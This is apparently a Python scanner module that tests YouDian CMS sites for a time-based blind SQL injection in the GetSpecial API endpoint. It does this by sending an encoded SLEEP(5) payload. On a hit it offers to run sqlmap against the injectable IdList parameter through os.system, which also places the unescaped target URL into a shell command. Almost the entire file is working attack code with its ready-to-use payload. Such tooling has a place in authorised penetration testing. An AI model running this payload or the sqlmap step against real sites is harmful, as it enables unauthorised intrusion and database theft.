#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import time

import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class YouDian_Sql_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20and%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29A"
            s = time.time()
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            e = time.time()
            rest = e-s
            if rest > 5:
                if not self.batch:
                    OutPrintInfoSuc("YouDian", '目标存在友点cms接口SQL漏洞')
                    OutPrintInfo("YouDian", url)
                else:
                    OutPrintInfoSuc("YouDian", f'目标存在友点cms接口SQL漏洞: {url}')
                    OutPutFile("youdian_sql.txt",f'目标存在友点cms接口SQL漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("YouDian", f'目标 {input_url} 不存在友点cms接口SQL漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("YouDian",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("YouDian", '开始检测友点cms接口SQL漏洞...')
        if self.get_url(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否调用sqlmap执行检测([b red]y/n[/b red])")
                if choose == "y":
                    import os
                    try:
                        dir = os.getcwd()
                        OutPrintInfo("SqlMap",f'[b bright_red]Query[/b bright_red]: \n[b magenta]sqlmap -u "{url}/index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20*" --output-dir={dir}/result/ --batch')
                        os.system(f"sqlmap -u \"{url}/index.php/api/GetSpecial?debug=1&ChannelID=1&IdList=1,1%29%20*\" --output-dir={dir}/result/ --batch")
                    except Exception as e:
                        OutPrintInfoErr(e)
        if not self.batch:
            OutPrintInfo("YouDian", '友点cms接口SQL漏洞检测结束')

